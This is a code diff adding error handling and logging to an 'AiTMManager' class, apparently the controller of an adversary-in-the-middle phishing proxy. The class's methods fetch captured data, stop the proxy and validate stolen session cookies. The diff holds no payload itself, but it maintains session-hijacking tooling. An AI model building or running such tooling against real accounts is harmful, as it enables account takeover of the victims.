@@ -448,24 +448,44 @@ class AiTMManager:
     
     def get_attack_results(self) -> dict:
         """Get captured data from AiTM proxy"""
-        if self.proxy:
-            return self.proxy.get_captured_data()
-        return {}
+        try:
+            if self.proxy and hasattr(self.proxy, 'get_captured_data'):
+                return self.proxy.get_captured_data()
+            elif hasattr(self.proxy, 'captured_data'):
+                # Handle direct captured_data access
+                return self.proxy.captured_data
+            else:
+                print(f"[AiTMManager] No proxy or captured_data available, proxy: {type(self.proxy)}")
+                return {}
+        except Exception as e:
+            print(f"[AiTMManager] Exception in get_attack_results: {e}")
+            return {}
     
     def stop_aitm_attack(self) -> bool:
         """Stop the AiTM proxy"""
         try:
-            if self.proxy:
+            if self.proxy and hasattr(self.proxy, 'stop_proxy'):
                 self.proxy.stop_proxy()
                 self.proxy_enabled = False
+                print(f"[AiTMManager] AiTM proxy stopped successfully")
                 return True
-            return False
+            else:
+                print(f"[AiTMManager] No proxy to stop or proxy lacks stop_proxy method")
+                self.proxy_enabled = False
+                return True  # Consider it successful if there's nothing to stop
         except Exception as e:
-            print(f"Error stopping AiTM: {e}")
+            print(f"[AiTMManager] Error stopping AiTM: {e}")
+            self.proxy_enabled = False
             return False
     
     def validate_session(self) -> dict:
         """Validate captured session cookies"""
-        if self.proxy:
-            return self.proxy.validate_captured_cookies()
-        return {'valid': False, 'error': 'No active proxy'}
+        try:
+            if self.proxy and hasattr(self.proxy, 'validate_captured_cookies'):
+                return self.proxy.validate_captured_cookies()
+            else:
+                print(f"[AiTMManager] No proxy available for session validation")
+                return {'valid': False, 'error': 'No active proxy'}
+        except Exception as e:
+            print(f"[AiTMManager] Exception during session validation: {e}")
+            return {'valid': False, 'error': f'Validation error: {str(e)}'}
